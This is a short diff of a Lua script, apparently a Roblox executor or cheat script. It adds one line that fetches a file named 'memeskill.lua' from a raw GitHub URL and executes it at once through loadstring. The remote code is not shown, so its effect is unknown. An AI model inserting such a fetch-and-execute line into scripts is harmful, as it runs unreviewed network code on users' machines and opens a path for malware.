@@ -8,6 +8,7 @@
 
 local _wait = task.wait
 repeat _wait() until game:IsLoaded()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/AyoItsHanee/main/main/memeskill.lua'))()
 local _env = getgenv and getgenv() or {}
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
